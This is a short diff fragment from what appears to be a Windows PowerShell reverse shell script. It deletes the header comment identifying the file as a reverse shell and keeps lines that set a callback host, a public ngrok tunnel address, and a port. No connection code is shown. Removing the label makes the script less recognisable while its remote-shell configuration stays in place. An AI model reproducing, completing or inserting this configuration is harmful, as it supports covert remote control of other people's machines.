@@ -1,4 +1,3 @@
-# Reverse Shell Script (Windows) - Save as revshell.ps1
 $point = "10.tcp.eu.ngrok.io"
 $port = 29847
 
